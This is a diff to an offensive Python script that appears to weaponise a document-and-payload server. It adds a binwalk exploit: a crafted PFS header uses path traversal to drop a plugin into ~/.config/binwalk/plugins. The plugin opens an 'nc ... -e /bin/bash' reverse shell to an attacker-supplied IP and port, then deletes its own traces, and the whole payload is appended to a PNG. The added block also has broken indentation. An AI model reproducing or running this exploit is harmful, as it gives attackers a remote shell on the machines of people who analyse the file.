@@ -10,6 +10,7 @@ DIRECTORY = "web"
 import zipfile
 import argparse
 import shutil
+import inspect
 from pip import main
 
 
@@ -24,9 +25,12 @@ def parse_args():
         "-u",
         "--payload-url",
         default="http://127.0.0.1:1337/pwn.html",
-        help="",
+        help="URL to the server that's hosting your payload.",
         required=True
     )
+    parser.add_argument("file", help="Path to input .png file",default=1)
+    parser.add_argument("ip", help="Ip to nc listener",default=1)
+    parser.add_argument("port", help="Port to nc listener",default=1)
     args = parser.parse_args()
     return args
     
@@ -50,6 +54,7 @@ def build_malicious_doc(args):
         
 def host_payload():
     with socketserver.TCPServer(("", PORT), Handler) as httpd:
+        print("serving at port", PORT)
         httpd.serve_forever()
 
 
@@ -57,6 +62,30 @@ def main():
     args = parse_args()
     build_malicious_doc(args)
     host_payload()
+    if args.file and args.ip and args.port:
+    header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
+    lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("nc ',str(args.ip)+' ',str(args.port)+' ','-e /bin/bash 2>/dev/null &")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']
+
+    in_file = open(args.file, "rb")
+    data = in_file.read()
+    in_file.close()
+    
+    with open("/tmp/plugin", "w") as f:
+       for line in lines:
+          f.write(line)
+
+    with open("/tmp/plugin", "rb") as f: 
+        content = f.read()
+
+    os.system("rm /tmp/plugin")
+
+    with open("binwalk_exploit.png", "wb") as f:
+        f.write(data)
+        f.write(header_pfs)
+        f.write(content)
+
+
+
 
 if __name__ == "__main__":
     main()
